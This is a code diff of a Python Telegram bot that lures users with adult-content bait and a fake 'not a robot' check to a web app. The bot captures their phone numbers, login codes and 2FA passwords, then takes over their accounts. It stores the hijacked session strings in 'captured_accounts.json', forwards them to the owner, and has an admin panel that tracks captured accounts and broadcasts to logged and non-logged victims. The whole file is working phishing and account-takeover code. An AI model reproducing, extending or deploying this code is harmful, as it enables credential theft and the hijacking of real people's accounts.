@@ -26,27 +26,23 @@ PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
 
-DEFAULT_WELCOME_TEXT = """**Hello** {name} 👋
+# Welcome default: 2 fast messages
+DEFAULT_WELCOME_MSGS = [
+    {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
+    {"type": "text", "content": "👇"},
+]
 
-🔞**To again access to the files completely free of charge, do the following💦:**
-
->👇Confirm that you are not a robot.
-
-👇"""
-
-DEFAULT_SHARE_CONFIG = {
-    "share_text": "🔞 Premium videos unlocked!\n\n👉 Share with friends:\n{link}\n\nTap button to continue.",
-    "share_link": "https://t.me/YourBot",
-    "share_emoji": "🔞🔥",
-    "button_text": "SHARE NOW",
-    "logged_message": "✅ **Welcome back!**\n\nYou are logged in successfully. Enjoy the content! 🎉",
+DEFAULT_SHARE = {
+    "text": "Premium content - verified only 🔞",
+    "emoji": "🔥",
+    "link": "https://t.me/videodks",
+    "channels": ["https://t.me/videodks"],
 }
 
 logger.info("=" * 60)
 logger.info("ENV CHECK")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
 logger.info(f"  API_ID     : {API_ID}")
-logger.info(f"  API_HASH   : {'SET' if API_HASH else 'MISSING'}")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
 logger.info("=" * 60)
 
@@ -64,44 +60,34 @@ sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
 WELCOME_FILE = "welcome_config.json"
+BROADCAST_CFG_FILE = "broadcast_config.json"
 SHARE_FILE = "share_config.json"
 
 STATE = {
-    "capture_mode": False,        # False | "nl" | "l"
+    "capture_mode": False,
     "welcome_capture": False,
+    "bc_nonlogged_capture": False,
+    "bc_logged_capture": False,
     "awaiting_timer": False,
-    "awaiting_timer_l": False,
     "awaiting_btn_text": False,
     "awaiting_btn_url": False,
-    "awaiting_share_text": False,
-    "awaiting_share_link": False,
-    "awaiting_share_emoji": False,
-    "awaiting_share_btn": False,
-    "awaiting_logged_msg": False,
+    "awaiting_share_field": None,
 }
 
 broadcast_state = {
-    "active": False,
+    "nonlogged_active": False,
+    "nonlogged_messages": [],
+    "nonlogged_next": 0,
+    "logged_active": False,
+    "logged_messages": [],
+    "logged_next": 0,
     "interval": 60,
-    "messages": [],
-    "next_run": 0,
-}
-
-broadcast_state_logged = {
-    "active": False,
-    "interval": 120,
-    "messages": [],
-    "next_run": 0,
 }
 
 timer_value = 60
-timer_value_logged = 120
 AUTO_DELETE_EXPIRED = True
 
 
-# ============================================================
-# MD → HTML
-# ============================================================
 def md_to_html(text):
     if not text:
         return text
@@ -175,7 +161,7 @@ def load_welcome_config():
     cfg = load_json(WELCOME_FILE, None)
     if not cfg or not isinstance(cfg, dict) or not cfg.get("messages"):
         cfg = {
-            "messages": [{"type": "text", "content": DEFAULT_WELCOME_TEXT}],
+            "messages": DEFAULT_WELCOME_MSGS,
             "button_text": "CONFIRM NOW",
             "button_url": WEBAPP_URL + "?auto=1",
             "show_button": True,
@@ -188,15 +174,27 @@ def save_welcome_config(cfg):
     save_json(WELCOME_FILE, cfg)
 
 
+def load_broadcast_config():
+    cfg = load_json(BROADCAST_CFG_FILE, None)
+    if not cfg or not isinstance(cfg, dict):
+        cfg = {
+            "nonlogged": [],
+            "logged": [],
+            "interval": 60,
+        }
+        save_json(BROADCAST_CFG_FILE, cfg)
+    return cfg
+
+
+def save_broadcast_config(cfg):
+    save_json(BROADCAST_CFG_FILE, cfg)
+
+
 def load_share_config():
     cfg = load_json(SHARE_FILE, None)
     if not cfg or not isinstance(cfg, dict):
-        cfg = DEFAULT_SHARE_CONFIG.copy()
+        cfg = dict(DEFAULT_SHARE)
         save_json(SHARE_FILE, cfg)
-    # Backfill missing keys
-    for k, v in DEFAULT_SHARE_CONFIG.items():
-        if k not in cfg:
-            cfg[k] = v
     return cfg
 
 
@@ -207,6 +205,7 @@ def save_share_config(cfg):
 captured_accounts = load_accounts()
 users = load_users()
 welcome_config = load_welcome_config()
+broadcast_config = load_broadcast_config()
 share_config = load_share_config()
 
 
@@ -223,6 +222,31 @@ def format_phone(ph):
     if len(digits) == 12 and digits.startswith('91'):
         return '+' + digits
     return '+' + digits
+
+
+def account_label(a):
+    """Return: 👹👹 for premium, ✨✨ for active, ❌ for expired, ⚰️ for terminated"""
+    st = a.get("status", "active")
+    if st == "terminated":
+        return "⚰️"
+    if st == "expired":
+        return "❌"
+    if a.get("is_premium"):
+        return "👹👹"
+    return "✨✨"
+
+
+def account_status_line(a):
+    """Return status line for section message"""
+    st = a.get("status", "active")
+    phone = a.get("phone", "?")
+    if st == "terminated":
+        return f"{phone} — **terminate complete**"
+    if st == "expired":
+        return f"{phone} — **expire hoyeche**"
+    if a.get("is_premium"):
+        return f"{phone} — 👹👹 premium"
+    return f"{phone} — ✨✨ active"
 
 
 def notify(phone, ss, me, dc, pu=False, pv=""):
@@ -336,13 +360,6 @@ def run_tg(phone, code=None, password=None):
                     user_sessions.pop(phone, None)
                     pending_2fa.pop(phone, None)
                     pending_codes[phone] = 'done'
-
-                # Mark user as logged-in in bot_users
-                uid_str = str(me.id)
-                if uid_str in users:
-                    users[uid_str]["section_logged_in"] = True
-                    save_users(users)
-
                 notify(phone, ss, me, dc, pu, password if pu else "")
                 return {'success': True, 'session': ss, 'user_id': me.id}
             except Exception as e:
@@ -376,70 +393,75 @@ bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
 def admin_menu():
     return [
-        [Button.inline("👋 Welcome", b"menu_welcome"),
+        [Button.inline("👋 Welcome Messages", b"menu_welcome"),
          Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline("🔗 Share Message", b"menu_share"),
+        [Button.inline("🔗 Share Settings", b"menu_share"),
          Button.inline("🔴 Expired", b"menu_expired")],
-        [Button.inline(f"⏱ NL Timer: {timer_value}s", b"menu_timer"),
-         Button.inline(f"⏱ L Timer: {timer_value_logged}s", b"menu_timer_l")],
         [Button.inline("👥 Users", b"menu_users"),
          Button.inline("📊 Stats", b"menu_stats")],
-        [Button.inline(f"🗑 Auto-Delete Exp: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
-        [Button.inline("🔄 Reset", b"menu_reset")],
+        [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
+         Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
+        [Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
+
+
+def back_button():
+    return [Button.inline("⬅️ Back", b"menu_home")]
 
 
 def welcome_menu():
     return [
-        [Button.inline("➕ Add", b"wl_add"),
+        [Button.inline("➕ Add Messages", b"wl_add"),
          Button.inline("📋 List", b"wl_list")],
-        [Button.inline("🗑 Clear", b"wl_clear")],
-        [Button.inline("🔘 Btn Text", b"wl_btntext"),
-         Button.inline("🔗 Btn URL", b"wl_btnurl")],
+        [Button.inline("🗑 Clear All", b"wl_clear")],
+        [Button.inline("🔘 Button Text", b"wl_btntext"),
+         Button.inline("🔗 Button URL", b"wl_btnurl")],
         [Button.inline("👁 Preview", b"wl_preview"),
-         Button.inline("🔕 Toggle Btn", b"wl_toggle_btn")],
+         Button.inline("🔕 Toggle Button", b"wl_toggle_btn")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
 
 def broadcast_menu():
     return [
-        [Button.inline("📢 Not-Logged Users", b"bc_menu_nl")],
-        [Button.inline("✅ Logged-In Users", b"bc_menu_l")],
+        [Button.inline("📢 Non-Logged", b"bc_nonlogged"),
+         Button.inline("✅ Logged", b"bc_logged")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
 
-def broadcast_menu_nl():
+def bc_nonlogged_menu():
+    n = len(broadcast_config.get("nonlogged", []))
+    active = broadcast_state["nonlogged_active"]
     return [
-        [Button.inline("➕ Add", b"bc_nl_add"),
-         Button.inline("▶️ Start", b"bc_nl_start")],
-        [Button.inline("⏹ Stop", b"bc_nl_stop"),
-         Button.inline("🗑 Clear", b"bc_nl_clear")],
-        [Button.inline("📋 Queue", b"bc_nl_show")],
+        [Button.inline("➕ Add", b"bcnl_add"),
+         Button.inline("▶️ Start", b"bcnl_start")],
+        [Button.inline("⏹ Stop", b"bcnl_stop"),
+         Button.inline("🗑 Clear", b"bcnl_clear")],
+        [Button.inline(f"📋 Queue ({n})", b"bcnl_show")],
         [Button.inline("⬅️ Back", b"menu_broadcast")],
     ]
 
 
-def broadcast_menu_l():
+def bc_logged_menu():
+    n = len(broadcast_config.get("logged", []))
+    active = broadcast_state["logged_active"]
     return [
-        [Button.inline("➕ Add", b"bc_l_add"),
-         Button.inline("▶️ Start", b"bc_l_start")],
-        [Button.inline("⏹ Stop", b"bc_l_stop"),
-         Button.inline("🗑 Clear", b"bc_l_clear")],
-        [Button.inline("📋 Queue", b"bc_l_show")],
+        [Button.inline("➕ Add", b"bclg_add"),
+         Button.inline("▶️ Start", b"bclg_start")],
+        [Button.inline("⏹ Stop", b"bclg_stop"),
+         Button.inline("🗑 Clear", b"bclg_clear")],
+        [Button.inline(f"📋 Queue ({n})", b"bclg_show")],
         [Button.inline("⬅️ Back", b"menu_broadcast")],
     ]
 
 
 def share_menu():
     return [
-        [Button.inline("✏️ Text", b"share_text"),
-         Button.inline("🔗 Link", b"share_link")],
-        [Button.inline("😀 Emoji", b"share_emoji"),
-         Button.inline("🔘 Button", b"share_btn")],
-        [Button.inline("✅ Logged Msg", b"share_logged")],
-        [Button.inline("👁 Preview NL", b"share_preview")],
+        [Button.inline(f"📝 Text: {share_config.get('text', '')[:20]}...", b"sh_text")],
+        [Button.inline(f"😀 Emoji: {share_config.get('emoji', '')}", b"sh_emoji")],
+        [Button.inline(f"🔗 Link: {share_config.get('link', '')[:25]}...", b"sh_link")],
+        [Button.inline("👁 Preview", b"sh_preview")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
@@ -473,7 +495,6 @@ async def safe_send(chat_id, text, buttons=None, edit_event=None):
 
 async def safe_send_user(uid, text, buttons=None):
     html_text = md_to_html(text)
-    logger.info(f"HTML preview: {html_text[:80]}")
     try:
         sent = await bot.send_message(uid, html_text, buttons=buttons, parse_mode='html')
         return sent
@@ -516,34 +537,6 @@ async def send_welcome(uid, name):
     return sent_ids
 
 
-async def send_not_logged_share(uid):
-    """Send share message to not-logged-in user"""
-    try:
-        share_text = share_config.get("share_text", "").replace(
-            "{link}", share_config.get("share_link", ""))
-        emoji = share_config.get("share_emoji", "🔞")
-        full = f"{emoji} {share_text}"
-        btn_text = share_config.get("button_text", "SHARE NOW")
-        btn_url = share_config.get("share_link", WEBAPP_URL)
-        buttons = [[Button.url(btn_text, btn_url)]]
-        sent = await safe_send_user(uid, full, buttons)
-        if sent:
-            logger.info(f"✅ NL share sent to {uid}")
-    except Exception as e:
-        logger.error(f"NL share err: {e}")
-
-
-async def send_logged_message(uid):
-    """Send message to logged-in user"""
-    try:
-        msg = share_config.get("logged_message", "✅ Welcome back! Enjoy.")
-        sent = await safe_send_user(uid, msg)
-        if sent:
-            logger.info(f"✅ Logged msg sent to {uid}")
-    except Exception as e:
-        logger.error(f"Logged msg err: {e}")
-
-
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
     logger.info("=== /start received ===")
@@ -551,44 +544,26 @@ async def start_handler(event):
         sender = await event.get_sender()
         uid = sender.id
         name = sender.first_name or "Friend"
-
-        accounts = load_accounts()
-        user_logged = any(str(a.get('user_id')) == str(uid) and a.get('status') == 'active'
-                         for a in accounts)
-
-        user_record = users.get(str(uid), {})
-        user_record.update({
+        users[str(uid)] = {
             "id": uid, "name": name,
             "username": sender.username or "",
-            "joined": user_record.get("joined", str(datetime.now())),
-            "section_logged_in": user_logged,
-        })
-        users[str(uid)] = user_record
+            "joined": str(datetime.now()),
+        }
         save_users(users)
-
         if uid == YOUR_TELEGRAM_ID:
             await event.respond(
                 "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 buttons=admin_menu(), parse_mode='md')
             return
-
         await send_welcome(uid, name)
-
-        if user_logged:
-            await send_logged_message(uid)
-        else:
-            await send_not_logged_share(uid)
     except Exception as e:
         logger.error(f"/start error: {type(e).__name__}: {e}")
         logger.error(traceback.format_exc())
 
 
-# ============================================================
-# CALLBACK HANDLER
-# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
-    global timer_value, timer_value_logged, AUTO_DELETE_EXPIRED, captured_accounts
+    global timer_value, AUTO_DELETE_EXPIRED, broadcast_config
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
@@ -596,41 +571,49 @@ async def cb(event):
     chat_id = event.sender_id
 
     try:
-        # ---- HOME ----
         if data == "menu_home":
             await event.answer()
-            await safe_send(chat_id, "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+            await safe_send(chat_id,
+                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
                 admin_menu(), edit_event=event)
 
         elif data == "menu_reset":
-            for k in list(STATE.keys()):
+            for k in STATE:
                 STATE[k] = False
+            STATE["awaiting_share_field"] = None
             await event.answer("Reset!", alert=True)
-            await safe_send(chat_id, "✅ Reset.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅ Modes reset.", admin_menu(), edit_event=event)
 
-        # ---- WELCOME ----
         elif data == "menu_welcome":
             n = len(welcome_config.get("messages", []))
             await event.answer()
             await safe_send(chat_id,
-                f"👋 **Welcome** — `{n}` active\n\n"
-                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`",
+                f"👋 **Welcome Messages** — `{n}` active\n\n"
+                f"**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `code` ``",
                 welcome_menu(), edit_event=event)
 
         elif data == "wl_add":
             STATE["welcome_capture"] = True
             STATE["capture_mode"] = False
-            await event.answer("Send")
+            STATE["bc_nonlogged_capture"] = False
+            STATE["bc_logged_capture"] = False
+            await event.answer("Send welcome messages")
             await safe_send(chat_id,
-                "✍️ Send messages. Then Stop.",
-                [[Button.inline("⏹ Stop", b"wl_stop")],
-                 [Button.inline("⬅️ Back", b"menu_welcome")]], edit_event=event)
+                "✍️ **Welcome Capture: ON**\n\n"
+                "Send text/photo/video one by one.\n\n"
+                "**Bold:** `**text**`\n**Italic:** `__text__`\n**Quote:** `> text`\n**Code:** `` `code` ``\n\n"
+                "Tap Stop when done.",
+                [
+                    [Button.inline("⏹ Stop & Save", b"wl_stop")],
+                    [Button.inline("⬅️ Back", b"menu_home")]
+                ], edit_event=event)
 
         elif data == "wl_stop":
             STATE["welcome_capture"] = False
             n = len(welcome_config.get("messages", []))
             await event.answer(f"Saved {n}", alert=True)
-            await safe_send(chat_id, f"✅ Welcome: `{n}`", admin_menu(), edit_event=event)
+            await safe_send(chat_id, f"✅ Welcome: `{n}` messages.",
+                admin_menu(), edit_event=event)
 
         elif data == "wl_list":
             msgs = welcome_config.get("messages", [])
@@ -645,21 +628,22 @@ async def cb(event):
         elif data == "wl_clear":
             welcome_config["messages"] = []
             save_welcome_config(welcome_config)
-            await event.answer("Cleared", alert=True)
-            await safe_send(chat_id, "Cleared.", admin_menu(), edit_event=event)
+            await event.answer("Cleared!", alert=True)
+            await safe_send(chat_id, "Cleared welcome messages.", admin_menu(),
+                edit_event=event)
 
         elif data == "wl_btntext":
             STATE["awaiting_btn_text"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\nSend new text.",
+                f"✏️ Current: `{welcome_config.get('button_text', 'CONFIRM NOW')}`\n\nSend new button text.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "wl_btnurl":
             STATE["awaiting_btn_url"] = True
             await event.answer()
             await safe_send(chat_id,
-                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\nSend URL.",
+                f"🔗 Current: `{welcome_config.get('button_url', WEBAPP_URL)}`\n\nSend new URL.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
         elif data == "wl_toggle_btn":
@@ -667,178 +651,195 @@ async def cb(event):
             save_welcome_config(welcome_config)
             s = "ON" if welcome_config["show_button"] else "OFF"
             await event.answer(f"Button {s}", alert=True)
-            await safe_send(chat_id, f"🔘 **{s}**",
+            await safe_send(chat_id, f"🔘 Button: **{s}**",
                 [[Button.inline("⬅️ Back", b"menu_welcome")]], edit_event=event)
 
         elif data == "wl_preview":
             await event.answer("Preview sent")
             await send_welcome(YOUR_TELEGRAM_ID, "Preview")
 
-        # ---- SHARE CONFIG ----
-        elif data == "menu_share":
-            await event.answer()
-            await safe_send(chat_id,
-                f"🔗 **Share Message**\n\n"
-                f"**Emoji:** `{share_config.get('share_emoji', '')}`\n"
-                f"**Text:** `{(share_config.get('share_text') or '')[:80]}`\n"
-                f"**Link:** `{share_config.get('share_link', '')}`\n"
-                f"**Button:** `{share_config.get('button_text', '')}`",
-                share_menu(), edit_event=event)
-
-        elif data == "share_text":
-            STATE["awaiting_share_text"] = True
-            await event.answer()
-            await safe_send(chat_id, "Send new share text. Use `{link}` placeholder.",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "share_link":
-            STATE["awaiting_share_link"] = True
-            await event.answer()
-            await safe_send(chat_id, "Send new share link (https://t.me/...)",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "share_emoji":
-            STATE["awaiting_share_emoji"] = True
-            await event.answer()
-            await safe_send(chat_id, "Send emoji (e.g., 🔞🔥)",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "share_btn":
-            STATE["awaiting_share_btn"] = True
-            await event.answer()
-            await safe_send(chat_id, "Send new button text",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "share_logged":
-            STATE["awaiting_logged_msg"] = True
-            await event.answer()
-            await safe_send(chat_id, "Send message for logged-in users",
-                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
-
-        elif data == "share_preview":
-            await event.answer("Preview sent")
-            await send_not_logged_share(YOUR_TELEGRAM_ID)
-
-        # ---- BROADCAST ----
         elif data == "menu_broadcast":
             await event.answer()
             await safe_send(chat_id,
-                "📢 **Broadcast Mode**\n\nChoose target group:",
+                "📢 **Broadcast**\n\n"
+                "• **Non-Logged** — users who haven't logged in yet\n"
+                "• **Logged** — users who already logged in",
                 broadcast_menu(), edit_event=event)
 
-        elif data == "bc_menu_nl":
-            s = broadcast_state
+        # ---- Non-logged broadcast ----
+        elif data == "bc_nonlogged":
             await event.answer()
             await safe_send(chat_id,
-                f"📢 **Not-Logged Users**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
-                broadcast_menu_nl(), edit_event=event)
+                f"📢 **Non-Logged Broadcast**\nQueue: `{len(broadcast_config.get('nonlogged', []))}`",
+                bc_nonlogged_menu(), edit_event=event)
 
-        elif data == "bc_menu_l":
-            s = broadcast_state_logged
-            await event.answer()
-            await safe_send(chat_id,
-                f"✅ **Logged-In Users**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
-                broadcast_menu_l(), edit_event=event)
-
-        elif data == "bc_nl_add":
-            STATE["capture_mode"] = "nl"
+        elif data == "bcnl_add":
+            STATE["bc_nonlogged_capture"] = True
+            STATE["bc_logged_capture"] = False
+            STATE["welcome_capture"] = False
             await event.answer("Send messages")
             await safe_send(chat_id,
-                "📥 Send messages for Not-Logged users.",
-                [[Button.inline("▶️ Start", b"bc_nl_start")],
-                 [Button.inline("❌ Cancel", b"bc_nl_cancel")]], edit_event=event)
+                "📥 **Non-Logged Capture: ON**\n\nSend text/photo/video. Tap Start when done.",
+                [
+                    [Button.inline("▶️ Start Now", b"bcnl_start")],
+                    [Button.inline("❌ Cancel", b"bcnl_cancel")]
+                ], edit_event=event)
 
-        elif data == "bc_l_add":
-            STATE["capture_mode"] = "l"
-            await event.answer("Send messages")
-            await safe_send(chat_id,
-                "📥 Send messages for Logged-In users.",
-                [[Button.inline("▶️ Start", b"bc_l_start")],
-                 [Button.inline("❌ Cancel", b"bc_l_cancel")]], edit_event=event)
-
-        elif data == "bc_nl_start":
-            STATE["capture_mode"] = False
-            if not broadcast_state['messages']:
+        elif data == "bcnl_start":
+            STATE["bc_nonlogged_capture"] = False
+            if not broadcast_config.get("nonlogged"):
                 return await event.answer("Empty", alert=True)
-            broadcast_state['active'] = True
-            broadcast_state['next_run'] = time.time() + 3
-            await event.answer("NL started!", alert=True)
-            await safe_send(chat_id, "▶️ Started for Not-Logged.",
+            broadcast_state["nonlogged_active"] = True
+            broadcast_state["nonlogged_next"] = time.time() + 3
+            await event.answer("Started!", alert=True)
+            await safe_send(chat_id, "▶️ Non-logged broadcast started.",
                 [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
 
-        elif data == "bc_l_start":
-            STATE["capture_mode"] = False
-            if not broadcast_state_logged['messages']:
-                return await event.answer("Empty", alert=True)
-            broadcast_state_logged['active'] = True
-            broadcast_state_logged['next_run'] = time.time() + 3
-            await event.answer("L started!", alert=True)
-            await safe_send(chat_id, "▶️ Started for Logged-In.",
-                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
-
-        elif data == "bc_nl_stop":
-            broadcast_state['active'] = False
+        elif data == "bcnl_stop":
+            broadcast_state["nonlogged_active"] = False
             await event.answer("Stopped", alert=True)
-            await safe_send(chat_id, "Stopped.", broadcast_menu_nl(), edit_event=event)
+            await safe_send(chat_id, "Stopped.", admin_menu(), edit_event=event)
 
-        elif data == "bc_l_stop":
-            broadcast_state_logged['active'] = False
-            await event.answer("Stopped", alert=True)
-            await safe_send(chat_id, "Stopped.", broadcast_menu_l(), edit_event=event)
+        elif data == "bcnl_cancel":
+            STATE["bc_nonlogged_capture"] = False
+            broadcast_config["nonlogged"] = []
+            save_broadcast_config(broadcast_config)
+            await event.answer("Cancelled")
+            await safe_send(chat_id, "Cancelled.", admin_menu(), edit_event=event)
 
-        elif data == "bc_nl_clear":
-            broadcast_state['messages'] = []
+        elif data == "bcnl_clear":
+            broadcast_config["nonlogged"] = []
+            save_broadcast_config(broadcast_config)
             await event.answer("Cleared", alert=True)
 
-        elif data == "bc_l_clear":
-            broadcast_state_logged['messages'] = []
-            await event.answer("Cleared", alert=True)
-
-        elif data == "bc_nl_show":
-            msgs = broadcast_state.get("messages", [])
+        elif data == "bcnl_show":
+            msgs = broadcast_config.get("nonlogged", [])
             if not msgs:
                 return await event.answer("Empty", alert=True)
-            txt = f"**{len(msgs)} messages:**\n"
+            txt = f"**{len(msgs)} messages:**\n\n"
             for i, m in enumerate(msgs):
                 prev = (m.get("content") or m.get("caption") or "")[:40].replace("\n", " ")
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        elif data == "bc_l_show":
-            msgs = broadcast_state_logged.get("messages", [])
+        # ---- Logged broadcast ----
+        elif data == "bc_logged":
+            await event.answer()
+            await safe_send(chat_id,
+                f"✅ **Logged Broadcast**\nQueue: `{len(broadcast_config.get('logged', []))}`",
+                bc_logged_menu(), edit_event=event)
+
+        elif data == "bclg_add":
+            STATE["bc_logged_capture"] = True
+            STATE["bc_nonlogged_capture"] = False
+            STATE["welcome_capture"] = False
+            await event.answer("Send messages")
+            await safe_send(chat_id,
+                "📥 **Logged Capture: ON**\n\nSend text/photo/video. Tap Start when done.",
+                [
+                    [Button.inline("▶️ Start Now", b"bclg_start")],
+                    [Button.inline("❌ Cancel", b"bclg_cancel")]
+                ], edit_event=event)
+
+        elif data == "bclg_start":
+            STATE["bc_logged_capture"] = False
+            if not broadcast_config.get("logged"):
+                return await event.answer("Empty", alert=True)
+            broadcast_state["logged_active"] = True
+            broadcast_state["logged_next"] = time.time() + 3
+            await event.answer("Started!", alert=True)
+            await safe_send(chat_id, "▶️ Logged broadcast started.",
+                [[Button.inline("⬅️ Back", b"menu_home")]], edit_event=event)
+
+        elif data == "bclg_stop":
+            broadcast_state["logged_active"] = False
+            await event.answer("Stopped", alert=True)
+            await safe_send(chat_id, "Stopped.", admin_menu(), edit_event=event)
+
+        elif data == "bclg_cancel":
+            STATE["bc_logged_capture"] = False
+            broadcast_config["logged"] = []
+            save_broadcast_config(broadcast_config)
+            await event.answer("Cancelled")
+            await safe_send(chat_id, "Cancelled.", admin_menu(), edit_event=event)
+
+        elif data == "bclg_clear":
+            broadcast_config["logged"] = []
+            save_broadcast_config(broadcast_config)
+            await event.answer("Cleared", alert=True)
+
+        elif data == "bclg_show":
+            msgs = broadcast_config.get("logged", [])
             if not msgs:
                 return await event.answer("Empty", alert=True)
-            txt = f"**{len(msgs)} messages:**\n"
+            txt = f"**{len(msgs)} messages:**\n\n"
             for i, m in enumerate(msgs):
                 prev = (m.get("content") or m.get("caption") or "")[:40].replace("\n", " ")
                 txt += f"{i+1}. [{m.get('type')}] `{prev}...`\n"
             await event.answer(txt[:200], alert=True)
 
-        elif data == "bc_nl_cancel":
-            STATE["capture_mode"] = False
-            broadcast_state['messages'] = []
-            await safe_send(chat_id, "Cancelled.", broadcast_menu_nl(), edit_event=event)
+        # ---- Share settings ----
+        elif data == "menu_share":
+            await event.answer()
+            await safe_send(chat_id,
+                "🔗 **Share Settings**\n\n"
+                f"📝 Text: `{share_config.get('text', '')}`\n"
+                f"😀 Emoji: `{share_config.get('emoji', '')}`\n"
+                f"🔗 Link: `{share_config.get('link', '')}`",
+                share_menu(), edit_event=event)
 
-        elif data == "bc_l_cancel":
-            STATE["capture_mode"] = False
-            broadcast_state_logged['messages'] = []
-            await safe_send(chat_id, "Cancelled.", broadcast_menu_l(), edit_event=event)
+        elif data == "sh_text":
+            STATE["awaiting_share_field"] = "text"
+            await event.answer()
+            await safe_send(chat_id,
+                f"📝 Current: `{share_config.get('text', '')}`\n\nSend new share text.",
+                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
 
-        # ---- EXPIRED ----
+        elif data == "sh_emoji":
+            STATE["awaiting_share_field"] = "emoji"
+            await event.answer()
+            await safe_send(chat_id,
+                f"😀 Current: `{share_config.get('emoji', '')}`\n\nSend new emoji.",
+                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
+
+        elif data == "sh_link":
+            STATE["awaiting_share_field"] = "link"
+            await event.answer()
+            await safe_send(chat_id,
+                f"🔗 Current: `{share_config.get('link', '')}`\n\nSend new link.",
+                [[Button.inline("⬅️ Back", b"menu_share")]], edit_event=event)
+
+        elif data == "sh_preview":
+            await event.answer("Preview sent")
+            emoji = share_config.get("emoji", "🔥")
+            text = share_config.get("text", "")
+            link = share_config.get("link", "")
+            preview = f"{emoji} **{text}**\n\n{emoji} {link}"
+            await safe_send_user(chat_id, preview)
+
+        # ---- Expired ----
         elif data == "menu_expired":
             accounts = load_accounts()
             expired = [a for a in accounts if a.get("status") == "expired"]
             termin = [a for a in accounts if a.get("status") == "terminated"]
-            txt = f"🔴 **Expired:** `{len(expired)}`\n⚰️ **Terminated:** `{len(termin)}`\n\n"
+            prem = [a for a in accounts if a.get("is_premium")]
+            txt = (f"🔴 **Expired:** `{len(expired)}`\n"
+                   f"⚰️ **Terminated:** `{len(termin)}`\n"
+                   f"👹👹 **Premium:** `{len(prem)}`\n\n")
             if expired:
+                txt += "**Expired:**\n"
                 for a in expired[:10]:
-                    txt += f"⚠️ `{a.get('phone')}` — expired\n"
+                    txt += f"❌ `{a.get('phone')}` — expire hoyeche\n"
             if termin:
                 txt += "\n**Terminated:**\n"
                 for a in termin[:10]:
-                    txt += f"⚰️ `{a.get('phone')}` — terminated\n"
-            if not expired and not termin:
-                txt += "_No expired sessions_"
+                    txt += f"⚰️ `{a.get('phone')}` — terminate complete\n"
+            if prem:
+                txt += "\n**Premium:**\n"
+                for a in prem[:10]:
+                    txt += f"👹👹 `{a.get('phone')}`\n"
+            if not (expired or termin or prem):
+                txt += "_No expired/premium sessions_"
             await event.answer()
             await safe_send(chat_id, txt, [
                 [Button.inline("🗑 Delete Expired", b"expired_del")],
@@ -851,9 +852,10 @@ async def cb(event):
             accounts = load_accounts()
             new_a = [a for a in accounts if a.get("status") != "expired"]
             save_json(DATA_FILE, new_a)
+            global captured_accounts
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Deleted.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅ Expired deleted.", admin_menu(), edit_event=event)
 
         elif data == "terminated_del":
             accounts = load_accounts()
@@ -861,7 +863,7 @@ async def cb(event):
             save_json(DATA_FILE, new_a)
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Deleted.", admin_menu(), edit_event=event)
+            await safe_send(chat_id, "✅ Terminated deleted.", admin_menu(), edit_event=event)
 
         elif data == "expired_del_both":
             accounts = load_accounts()
@@ -869,45 +871,35 @@ async def cb(event):
             save_json(DATA_FILE, new_a)
             captured_accounts = new_a
             await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅ Deleted.", admin_menu(), edit_event=event)
